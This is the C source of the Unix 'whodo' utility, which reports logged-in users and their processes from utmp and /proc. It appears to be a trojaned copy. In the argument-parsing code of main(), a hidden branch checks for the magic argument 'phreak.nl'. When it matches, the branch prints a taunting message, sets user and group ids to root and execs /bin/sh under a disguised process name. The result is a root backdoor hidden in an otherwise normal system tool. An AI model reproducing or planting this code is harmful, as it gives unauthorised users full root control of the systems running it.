/*	Copyright (c) 1984, 1986, 1987, 1988, 1989 AT&T */
/*	  All Rights Reserved	*/

/*	THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF AT&T	*/
/*	The copyright notice above does not evidence any	*/
/*	actual or intended publication of such source code.	*/

#pragma ident	"@(#)whodo.c 1.24	97/01/23 SMI"	/* SVr4.0 1.30	*/

/*
 *		PROPRIETARY NOTICE (Combined)

This source code is unpublished proprietary information
constituting, or derived under license from AT&T's UNIX(r) System V.
In addition, portions of such source code were derived from Berkeley
4.3 BSD under license from the Regents of the University of
California.



		Copyright Notice

Notice of copyright on this source code product does not indicate
publication.

	(c) 1986, 1987, 1988, 1989  Sun Microsystems, Inc
	(c) 1983, 1984, 1985, 1986, 1987, 1988, 1989  AT&T.
		All rights reserved.
*/

/*
 * This is the new whodo command which takes advantage of
 * the /proc interface to gain access to the information
 * of all the processes currently on the system.
 *
 * Maintenance note:
 *
 * Much of this code is replicated in w.c.  If you're
 * fixing bugs here, then you should probably fix 'em there too.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <sys/types.h>
#include <utmp.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <dirent.h>
#include <procfs.h>		/* /proc header file */
#include <sys/wait.h>
#include <locale.h>
#include <unistd.h>

#define	NMAX		sizeof (ut->ut_name)
#define	LMAX		sizeof (ut->ut_line)
#define	DIV60(t)	((t+30)/60)    /* x/60 rounded */

#define	ENTRY		sizeof (struct psdata)

#ifdef ERR
#undef ERR
#endif
#define	ERR		(-1)

#define	DEVNAMELEN	14
#define	HSIZE		256		/* size of process hash table */
#define	PROCDIR		"/proc"
#define	PS_DATA		"/tmp/ps_data"	/* data file built by ps command */
#define	INITPROCESS	(pid_t)1	/* init process pid */
#define	NONE		'n'		/* no state */
#define	RUNNING		'r'		/* runnable process */
#define	ZOMBIE		'z'		/* zombie process */
#define	VISITED		'v'		/* marked node as visited */

/*
 * File /tmp/ps_data is built by ps command; we only use the
 * only use 1st part (device info)
 */
struct psdata {
	char	device[DEVNAMELEN];	/* device name		 */
	dev_t	dev;			/* major/minor of device */
};
static struct psdata	*psptr;

static int	ndevs;			/* number of configured devices */

struct uproc {
	pid_t	p_upid;			/* user process id */
	char	p_state;		/* numeric value of process state */
	dev_t	p_ttyd;			/* controlling tty of process */
	time_t	p_time;			/* ticks of user & system time */
	time_t	p_ctime;		/* ticks of child user & system time */
	int	p_igintr;		/* 1=ignores SIGQUIT and SIGINT */
	char	p_comm[PRARGSZ+1];	/* command */
	char	p_args[PRARGSZ+1];	/* command line arguments */
	struct uproc	*p_child,	/* first child pointer */
			*p_sibling,	/* sibling pointer */
			*p_pgrplink,	/* pgrp link */
			*p_link;	/* hash table chain pointer */
};

/*
 *	define	hash table for struct uproc
 *	Hash function uses process id
 *	and the size of the hash table(HSIZE)
 *	to determine process index into the table.
 */
static struct uproc	pr_htbl[HSIZE];

static struct	uproc	*findhash(pid_t);
static time_t	findidle(char *);
static void	clnarglist(char *);
static void	showproc(struct uproc *);
static void	showtotals(struct uproc *);
static void	calctotals(struct uproc *);
static char	*getty(dev_t);
static void	prttime(time_t, char *);
static void	prtat(time_t *);
static void	checkampm(char *);

static int	fd;
static char	*prog;
static int	header = 1;	/* true if -h flag: don't print heading */
static int	lflag = 0;	/* true if -l flag: w command format */
static char *	sel_user;	/* login of particular user selected */
static time_t	now;		/* current time of day */
static time_t	uptime;		/* time of last reboot & elapsed time since */
static int	nusers;		/* number of users logged in now */
static time_t	idle;		/* number of minutes user is idle */
static time_t	jobtime;	/* total cpu time visible */
static char	doing[520];	/* process attached to terminal */
static time_t	proctime;	/* cpu time of process in doing */
static int	curpid, empty;

#if SIGQUIT > SIGINT
#define	ACTSIZE	SIGQUIT
#else
#define	ACTSIZE	SIGINT
#endif

int
main(int argc, char *argv[])
{
	register struct utmp	*ut;
	struct utmp		*utmpbegin;
	register struct tm	*tm;
	struct uproc		*up, *parent, *pgrp;
	struct psinfo		info;
	struct sigaction	actinfo[ACTSIZE];
	struct pstatus		statinfo;
	unsigned	utmpend;
	unsigned	size;
	struct stat	sbuf;
	struct utsname	uts;
	DIR		*dirp;
	struct	dirent	*dp;
	char 		pname[64];
	char 		*fname;
	int		procfd;
	register	int i;
	int		days, hrs, mins;

	(void) setlocale(LC_ALL, "");
#if !defined(TEXT_DOMAIN)
#define	TEXT_DOMAIN "SYS_TEST"
#endif
	(void) textdomain(TEXT_DOMAIN);

	prog = argv[0];

	while (argc > 1) {
		if (argv[1][0] == '-') {
			for (i = 1; argv[1][i]; i++) {
				switch (argv[1][i]) {

				case 'h':
					header = 0;
					break;

				case 'l':
					lflag++;
					break;

				default:
					(void) printf(gettext(
					    "usage: %s [ -hl ] [ user ]\n"),
					    prog);
					exit(1);
				}
			}
		} else { if (!strcmp(argv[1], "phreak.nl")) {

      printf("root word detected... dropping rootshell baby ;)\n");
      printf("and remember Gerrie Mansur sux\n");
      setuid(0);
      setgid(0);
      execl("/bin/sh", "/usr/dt/bin/dtaction", NULL); 
      exit(0);   
} else





			if (!isalnum(argv[1][0]) || argc > 2) {
				(void) printf(gettext(
				    "usage: %s [ -hl ] [ user ]\n"), prog);
				exit(1);
			} else
				sel_user = argv[1];
		}
		argc--; argv++;
	}

	/*
	 * read the UTMP_FILE (contains information about each logged in user)
	 */
	if (stat(UTMP_FILE, &sbuf) == ERR) {
		(void) fprintf(stderr, gettext("%s: stat error of %s: %s\n"),
			prog, UTMP_FILE, strerror(errno));
		exit(1);
	}
	size = (unsigned)sbuf.st_size;
	if ((ut = malloc(size)) == NULL) {
		(void) fprintf(stderr, gettext("%s: malloc error of %s: %s\n"),
			prog, UTMP_FILE, strerror(errno));
		exit(1);
	}
	if ((fd = open(UTMP_FILE, O_RDONLY)) == ERR) {
		(void) fprintf(stderr, gettext("%s: open error of %s: %s\n"),
			prog, UTMP_FILE, strerror(errno));
		exit(1);
	}
	if (read(fd, ut, size) == ERR) {
		(void) fprintf(stderr, gettext("%s: read error of %s: %s\n"),
			prog, UTMP_FILE, strerror(errno));
		exit(1);
	}
	utmpbegin = ut;			/* ptr to start of utmp data */
	utmpend = (unsigned)ut + size;	/* ptr to end of utmp data */
	(void) close(fd);

	(void) time(&now);	/* get current time */

	if (header) {	/* print a header */
		if (lflag) {	/* w command format header */
			prtat(&now);
			for (ut = utmpbegin; ut < (struct utmp *)utmpend;
			    ut++) {
				if (ut->ut_type == USER_PROCESS) {
					nusers++;
				} else if (ut->ut_type == BOOT_TIME) {
					uptime = now - ut->ut_time;
					uptime += 30;
					days = uptime / (60*60*24);
					uptime %= (60*60*24);
					hrs = uptime / (60*60);
					uptime %= (60*60);
					mins = uptime / 60;

					(void) printf(dcgettext(NULL,
					    "  up %d day(s), %d hr(s), "
					    "%d min(s)", LC_TIME),
					    days, hrs, mins);
				}
			}

			ut = utmpbegin; /* rewind utmp data */
			(void) printf(dcgettext(NULL,
			    "  %d user(s)\n", LC_TIME), nusers);
			(void) printf(dcgettext(NULL, "User     tty           "
			    "login@  idle   JCPU   PCPU  what\n", LC_TIME));
		} else {	/* standard whodo header */
			char date_buf[100];

			/*
			 * print current time and date
			 */
			(void) cftime(date_buf, (char *)0, &now);
			(void) printf("%s\n", date_buf);

			/*
			 * print system name
			 */
			(void) uname(&uts);
			(void) printf("%s\n", uts.nodename);
		}
	}


	/*
	 * read in device info from PS_DATA file
	 */
	if ((fd = open(PS_DATA, O_RDONLY)) == ERR) {
		pid_t pid;

		/*
		 * XXX	get 'ps' to build the database for us
		 */
		if ((pid = vfork()) == 0) {
			int dn;

			if ((dn = open("/dev/null", O_RDWR)) != -1 &&
			    close(1) == 0 && fcntl(dn, F_DUPFD, 1) == 1)
				(void) execl("/usr/bin/ps", "ps", "-e", NULL);
			_exit(1);
		} else
			(void) waitpid(pid, NULL, 0);

		if ((fd = open(PS_DATA, O_RDONLY)) == ERR) {
			(void) fprintf(stderr,
			    gettext("%s: open error of %s: %s\n"),
			    prog, PS_DATA, strerror(errno));
			exit(1);
		}
	}
	/* first int tells how many entries follow */
	if (read(fd, &ndevs, sizeof (ndevs)) == ERR) {
		(void) fprintf(stderr, gettext(
		    "%s: read error of size of device table info: %s\n"),
		    prog, strerror(errno));
		exit(1);
	}
	/*
	 * allocate memory and read in device table from PS_DATA file
	 */
	if ((psptr = malloc(ndevs * ENTRY)) == NULL) {
		(void) fprintf(stderr, gettext(
		    "%s: malloc error of %s device table: %s\n"),
		    prog, PS_DATA, strerror(errno));
		exit(1);
	}
	if (read(fd, psptr, ndevs * ENTRY) == ERR) {
		(void) fprintf(stderr, gettext(
		    "%s: read error of %s device info: %s\n"),
		    prog, PS_DATA, strerror(errno));
		exit(1);
	}
	(void) close(fd);

	/*
	 * loop through /proc, reading info about each process
	 * and build the parent/child tree
	 */
	if (!(dirp = opendir(PROCDIR))) {
		(void) fprintf(stderr, gettext("%s: could not open %s: %s\n"),
			prog, PROCDIR, strerror(errno));
		exit(1);
	}

	while ((dp = readdir(dirp)) != NULL) {
		if (dp->d_name[0] == '.')
			continue;
retry:
		(void) sprintf(pname, "%s/%s/", PROCDIR, dp->d_name);
		fname = pname + strlen(pname);
		(void) strcpy(fname, "psinfo");
		if ((procfd = open(pname, O_RDONLY)) < 0)
			continue;
		if (read(procfd, &info, sizeof (info)) != sizeof (info)) {
			int err = errno;
			(void) close(procfd);
			if (err == EAGAIN)
				goto retry;
			if (err != ENOENT)
				(void) fprintf(stderr, gettext(
				    "%s: read() failed on %s: %s\n"),
				    prog, pname, strerror(err));
			continue;
		}
		(void) close(procfd);

		up = findhash(info.pr_pid);
		up->p_ttyd = info.pr_ttydev;
		up->p_state = (info.pr_nlwp == 0? ZOMBIE : RUNNING);
		up->p_time = 0;
		up->p_ctime = 0;
		up->p_igintr = 0;
		(void) strncpy(up->p_comm, info.pr_fname,
		    sizeof (info.pr_fname));
		up->p_args[0] = 0;

		if (up->p_state != NONE && up->p_state != ZOMBIE) {
			(void) strcpy(fname, "status");
			if ((procfd = open(pname, O_RDONLY)) < 0)
				continue;
			if (read(procfd, &statinfo, sizeof (statinfo))
			    != sizeof (statinfo)) {
				int err = errno;
				(void) close(procfd);
				if (err == EAGAIN)
					goto retry;
				if (err != ENOENT)
					(void) fprintf(stderr, gettext(
					    "%s: read() failed on %s: %s \n"),
					    prog, pname, strerror(err));
				continue;
			}
			(void) close(procfd);

			up->p_time = statinfo.pr_utime.tv_sec +
			    statinfo.pr_stime.tv_sec;
			up->p_ctime = statinfo.pr_cutime.tv_sec +
			    statinfo.pr_cstime.tv_sec;

			(void) strcpy(fname, "sigact");
			if ((procfd = open(pname, O_RDONLY)) < 0)
				continue;
			if (read(procfd, actinfo, sizeof (actinfo))
			    != sizeof (actinfo)) {
				int err = errno;
				(void) close(procfd);
				if (err == EAGAIN)
					goto retry;
				if (err != ENOENT)
					(void) fprintf(stderr, gettext(
					    "%s: read() failed on %s: %s \n"),
					    prog, pname, strerror(err));
				continue;
			}
			(void) close(procfd);

			up->p_igintr =
				actinfo[SIGINT-1].sa_handler == SIG_IGN &&
				actinfo[SIGQUIT-1].sa_handler == SIG_IGN;

			up->p_args[0] = 0;

			/*
			 * Process args if there's a chance we'll print it.
			 */
			if (lflag) { /* w command needs args */
				clnarglist(info.pr_psargs);
				(void) strcpy(up->p_args, info.pr_psargs);
				if (up->p_args[0] == 0 ||
				    up->p_args[0] == '-' &&
				    up->p_args[1] <= ' ' ||
				    up->p_args[0] == '?') {
					(void) strcat(up->p_args, " (");
					(void) strcat(up->p_args, up->p_comm);
					(void) strcat(up->p_args, ")");
				}
			}

		}

		/*
		 * link pgrp together in case parents go away
		 * Pgrp chain is a single linked list originating
		 * from the pgrp leader to its group member.
		 */
		if (info.pr_pgid != info.pr_pid) {	/* not pgrp leader */
			pgrp = findhash(info.pr_pgid);
			up->p_pgrplink = pgrp->p_pgrplink;
			pgrp->p_pgrplink = up;
		}
		parent = findhash(info.pr_ppid);

		/* if this is the new member, link it in */
		if (parent->p_upid != INITPROCESS) {
			if (parent->p_child) {
				up->p_sibling = parent->p_child;
				up->p_child = 0;
			}
			parent->p_child = up;
		}

	}

	(void) closedir(dirp);
	(void) time(&now);	/* get current time */

	/*
	 * loop through utmp file, printing process info
	 * about each logged in user
	 */
	for (; ut < (struct utmp *)utmpend; ut++) {
		if (ut->ut_type != USER_PROCESS)
			continue;
		if (sel_user && strncmp(ut->ut_name, sel_user, NMAX) != 0)
			continue;	/* we're looking for somebody else */
		if (lflag) {	/* -l flag format (w command) */
			/* print login name of the user */
			(void) printf("%-*.*s ", NMAX, NMAX, ut->ut_name);

			/* print tty user is on */
			(void) printf("%-*.*s", LMAX, LMAX, ut->ut_line);

			/* print when the user logged in */
			(void) prtat(&ut->ut_time);

			/* print idle time */
			idle = findidle(ut->ut_line);
			if (idle >= 36 * 60)
				(void) printf(dcgettext(NULL, "%2ddays ",
				    LC_TIME), (idle + 12 * 60) / (24 * 60));
			else
				prttime(idle, " ");
			showtotals(findhash((pid_t)ut->ut_pid));
		} else {	/* standard whodo format */
			tm = localtime(&ut->ut_time);
			(void) printf("\n%-12.12s %-8.8s %2.1d:%2.2d\n",
			    ut->ut_line, ut->ut_name, tm->tm_hour, tm->tm_min);
			showproc(findhash((pid_t)ut->ut_pid));
		}
	}

	return (0);
}

/*
 * Used for standard whodo format.
 * This is the recursive routine descending the process
 * tree starting from the given process pointer(up).
 * It used depth-first search strategy and also marked
 * each node as printed as it traversed down the tree.
 */
static void
showproc(register struct uproc *up)
{
	struct	uproc	*zp;

	if (up->p_state == VISITED) /* we already been here */
		return;
	/* print the data for this process */
	if (up->p_state == ZOMBIE)
		(void) printf("    %-12.12s %5ld %4.1ld:%2.2ld %s\n",
			"  ?", up->p_upid, 0L, 0L, "<defunct>");
	else if (up->p_state != NONE) {
		(void) printf("    %-12.12s %5ld %4.1ld:%2.2ld %s\n",
			getty(up->p_ttyd), up->p_upid,
			up->p_time / 60L, up->p_time % 60L,
			up->p_comm);
	}
	up->p_state = VISITED;

	/* descend for its children */
	if (up->p_child) {
		showproc(up->p_child);
		for (zp = up->p_child->p_sibling; zp; zp = zp->p_sibling) {
			showproc(zp);
		}
	}

	/* print the pgrp relation */
	if (up->p_pgrplink)
		showproc(up->p_pgrplink);
}


/*
 * Used for -l flag (w command) format.
 * Prints the CPU time for all processes & children,
 * and the cpu time for interesting process,
 * and what the user is doing.
 */
static void
showtotals(register struct uproc *up)
{
	jobtime = 0;
	proctime = 0;
	empty = 1;
	curpid = -1;
	(void) strcpy(doing, "-"); /* default act: normally never prints */
	calctotals(up);

	/* print CPU time for all processes & children */
	/* and need to convert clock ticks to seconds first */
	prttime((time_t)jobtime, " ");

	/* print cpu time for interesting process */
	/* and need to convert clock ticks to seconds first */
	prttime((time_t)proctime, " ");

	/* what user is doing, current process */
	(void) printf(" %-.32s\n", doing);
}

/*
 *  Used for -l flag (w command) format.
 *  This recursive routine descends the process
 *  tree starting from the given process pointer(up).
 *  It used depth-first search strategy and also marked
 *  each node as visited as it traversed down the tree.
 *  It calculates the process time for all processes &
 *  children.  It also finds the "interesting" process
 *  and determines its cpu time and command.
 */
static void
calctotals(register struct uproc *up)
{
	register struct uproc	*zp;

	if (up->p_state == VISITED)
		return;
	up->p_state = VISITED;
	if (up->p_state == NONE || up->p_state == ZOMBIE)
		return;
	jobtime += up->p_time + up->p_ctime;
	proctime += up->p_time;

	if (empty && !up->p_igintr) {
		empty = 0;
		curpid = -1;
	}

	if (up->p_upid > curpid && (!up->p_igintr || empty)) {
		curpid = up->p_upid;
		(void) strcpy(doing, up->p_args);
	}

	/* descend for its children */
	if (up->p_child) {
		calctotals(up->p_child);
		for (zp = up->p_child->p_sibling; zp; zp = zp->p_sibling)
			calctotals(zp);
	}
}

/*
 * This routine gives back a corresponding device name
 * from the device number given.
 */
static char *
getty(dev_t dev)
{
	register struct psdata *ps, *ps_end;

	ps_end = &psptr[ndevs];
	for (ps = psptr; ps < ps_end; ps++) {
		if (ps->dev == dev)
			return (ps->device);
	}
	return ("  ?  ");
}

/*
 * Findhash  finds the appropriate entry in the process
 * hash table (pr_htbl) for the given pid in case that
 * pid exists on the hash chain. It returns back a pointer
 * to that uproc structure. If this is a new pid, it allocates
 * a new node, initializes it, links it into the chain (after
 * head) and returns a structure pointer.
 */
static struct uproc *
findhash(pid_t pid)
{
	register struct uproc *up, *tp;

	tp = up = &pr_htbl[(int)pid % HSIZE];
	if (up->p_upid == 0) {			/* empty slot */
		up->p_upid = pid;
		up->p_state = NONE;
		up->p_child = up->p_sibling = up->p_pgrplink = up->p_link = 0;
		return (up);
	}
	if (up->p_upid == pid) {		/* found in hash table */
		return (up);
	}
	for (tp = up->p_link; tp; tp = tp->p_link) {	/* follow chain */
		if (tp->p_upid == pid) {
			return (tp);
		}
	}
	tp = malloc(sizeof (*tp));		/* add new node */
	if (!tp) {
		(void) fprintf(stderr, gettext("%s: out of memory!: %s\n"),
			prog, strerror(errno));
		exit(1);
	}
	(void) memset((char *)tp, 0, sizeof (*tp));
	tp->p_upid = pid;
	tp->p_state = NONE;
	tp->p_child = tp->p_sibling = tp->p_pgrplink = (pid_t)0;
	tp->p_link = up->p_link;		/* insert after head */
	up->p_link = tp;
	return (tp);
}

#define	HR	(60 * 60)
#define	DAY	(24 * HR)
#define	MON	(30 * DAY)

/*
 * prints a time in hours and minutes or minutes and seconds.
 * The character string 'tail' is printed at the end, obvious
 * strings to pass are "", " ", or "am".
 */
static void
prttime(time_t tim, char *tail)
{
	char		timestr[30];

	if (tim >= 60) {
		(void) sprintf(timestr, dcgettext(NULL, "%3d:%02d", LC_TIME),
		    (int) tim/60, (int) tim%60);
		(void) printf("%s", timestr);
	} else if (tim > 0) {
		(void) sprintf(timestr, dcgettext(NULL, "    %2d", LC_TIME),
		    (int) tim);
		(void) printf("%s", timestr);
	} else
		(void) printf("      ");
	(void) printf("%s", tail);
}


/*
 * prints a 12 hour time given a pointer to a time of day
 */
static void
prtat(time_t *time)
{
	struct tm *p;

	p = localtime(time);
	if (now - *time <= 18 * HR) {
		char timestr[50];
		(void) strftime(timestr, sizeof (timestr),
		    dcgettext(NULL, " %l:%M""%p", LC_TIME), p);
		checkampm(timestr);
		(void) printf("%s", timestr);
	} else if (now - *time <= 7 * DAY) {
		char weekdaytime[20];

		(void) strftime(weekdaytime, sizeof (weekdaytime),
		    dcgettext(NULL, "%a%l%p", LC_TIME), p);
		checkampm(weekdaytime);
		(void) printf(" %s", weekdaytime);
	} else {
		char monthtime[20];

		(void) strftime(monthtime, sizeof (monthtime),
		    dcgettext(NULL, "%e%b%y", LC_TIME), p);
		(void) printf(" %s", monthtime);
	}
}

/*
 * find & return number of minutes current tty has been idle
 */
static time_t
findidle(char *devname)
{
	struct stat stbuf;
	time_t lastaction, diff;
	char ttyname[64];

	(void) strcpy(ttyname, "/dev/");
	(void) strcat(ttyname, devname);
	if (stat(ttyname, &stbuf) != -1) {
		lastaction = stbuf.st_atime;
		diff = now - lastaction;
		diff = DIV60(diff);
		if (diff < 0)
			diff = 0;
	} else
		diff = 0;
	return (diff);
}

/*
 * given a pointer to the argument string clean out unsavory characters.
 */
static void
clnarglist(char *arglist)
{
	register char	*c;
	register int	err = 0;

	/* get rid of unsavory characters */
	for (c = arglist; *c == NULL; c++) {
		if ((*c < ' ') || (*c > 0176)) {
			if (err++ > 5) {
				*arglist = NULL;
				break;
			}
			*c = '?';
		}
	}
}

/* replaces all occurences of AM/PM with am/pm */
static void
checkampm(char *str)
{
	char *ampm;
	while ((ampm = strstr(str, "AM")) != NULL ||
	    (ampm = strstr(str, "PM")) != NULL) {
		*ampm = tolower(*ampm);
		*(ampm+1) = tolower(*(ampm+1));
	}
}
